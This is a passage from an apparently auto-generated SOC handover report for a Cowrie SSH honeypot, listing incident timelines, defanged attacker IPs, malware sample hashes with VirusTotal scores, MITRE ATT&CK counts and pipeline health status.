| `2026-06-08 20:56:11` | `cowrie.login.success` |
| `2026-06-08 20:56:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.222.117[.]243` to AbuseIPDB if not already reported
- [ ] Block `35.222.117[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-298d0533d9a6

| Field | Detail |
|---|---|
| **Source IP** | `192.42.116[.]68` |
| **First Seen** | 2026-06-08 20:57 |
| **Last Seen** | 2026-06-08 20:58 |
| **Session Duration** | 26s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:57:52` | `cowrie.session.connect` |
| `2026-06-08 20:57:52` | `cowrie.client.version` |
| `2026-06-08 20:57:52` | `cowrie.client.kex` |
| `2026-06-08 20:57:53` | `cowrie.client.fingerprint` |
| `2026-06-08 20:57:53` | `cowrie.login.failed` |
| `2026-06-08 20:57:54` | `cowrie.login.success` |
| `2026-06-08 20:58:17` | `cowrie.direct-tcpip.request` |
| `2026-06-08 20:58:18` | `cowrie.direct-tcpip.ja4` |
| `2026-06-08 20:58:18` | `cowrie.direct-tcpip.data` |
| `2026-06-08 20:58:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.42.116[.]68` to AbuseIPDB if not already reported
- [ ] Block `192.42.116[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `167.71.225[.]225` | **62** | 2026-06-08 19:15 | 2026-06-08 21:20 | 40m | 0 | `T1592` | 🟠 MEDIUM |
| `128.199.25[.]179` | **59** | 2026-06-08 18:36 | 2026-06-08 21:51 | 38m | 0 | `T1592` | 🟠 MEDIUM |
| `120.48.77[.]176` | **31** | 2026-06-08 20:10 | 2026-06-08 20:57 | 44m | 8 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `35.222.117[.]243` | **30** | 2026-06-08 18:43 | 2026-06-08 20:56 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `154.83.13[.]181` | **13** | 2026-06-08 21:17 | 2026-06-08 21:51 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `143.110.178[.]27` | **11** | 2026-06-08 18:31 | 2026-06-08 21:51 | 9m | 0 | `T1592` | 🟠 MEDIUM |
| `20.81.140[.]174` | **6** | 2026-06-08 19:19 | 2026-06-08 21:38 | 5m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]115` | **3** | 2026-06-08 18:45 | 2026-06-08 18:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.95[.]172` | 1 | 2026-06-08 19:59 | 2026-06-08 20:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.39.93[.]73` | 1 | 2026-06-08 20:00 | 2026-06-08 20:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.105[.]62` | 1 | 2026-06-08 20:09 | 2026-06-08 20:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `167.99.234[.]119` | 1 | 2026-06-08 21:42 | 2026-06-08 21:42 | 2s | 0 | `T1592` | 🟢 LOW |
| `175.11.241[.]72` | 1 | 2026-06-08 21:03 | 2026-06-08 21:04 | 13s | 0 | `T1592` | 🟢 LOW |
| `192.240.203[.]7` | 1 | 2026-06-08 21:42 | 2026-06-08 21:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]161` | 1 | 2026-06-08 21:38 | 2026-06-08 21:38 | 2s | 0 | `T1592` | 🟢 LOW |
| `43.226.37[.]33` | 1 | 2026-06-08 20:12 | 2026-06-08 20:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `47.101.137[.]46` | 1 | 2026-06-08 20:48 | 2026-06-08 20:48 | 8s | 0 | `T1592` | 🟢 LOW |
| `59.63.155[.]54` | 1 | 2026-06-08 19:44 | 2026-06-08 19:44 | 12s | 0 | `T1592` | 🟢 LOW |
| `83.168.110[.]83` | 1 | 2026-06-08 19:34 | 2026-06-08 19:34 | 1s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `192.240.203[.]7` | NL | PHOENIX NAP, LLC. | **100** ⚠️ | 0 |
| `192.42.116[.]68` | NL | TOR EXIT AND MORE | **100** ⚠️ | 50 |
| `143.110.178[.]27` | IN | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `167.71.225[.]225` | IN | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `101.126.95[.]172` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `20.81.140[.]174` | US | Microsoft Corporation | **100** ⚠️ | 0 |
| `195.96.139[.]161` | GB | Driftnet Ltd | **100** ⚠️ | 9 |
| `83.168.110[.]83` | PL | Virtual Private Server | **100** ⚠️ | 29 |
| `43.226.37[.]33` | CN | Shenzhen Qianhai bird cloud computing Co. Ltd. | **100** ⚠️ | 12 |
| `128.199.25[.]179` | IN | DigitalOcean, LLC | **100** ⚠️ | 2 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 89 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 52 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 28 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 14 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 14 |

---

## 🔕 False Positive Summary (50 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 47 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 304 cases |
| Tool 34  | Credential Extractor        | ✅ 80 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 28 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 50 filtered (16.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 21 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 28 priority case(s) shown individually · 19 recon entry/entries in table (8 group(s) consolidating 215 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-08T21:53:21Z_
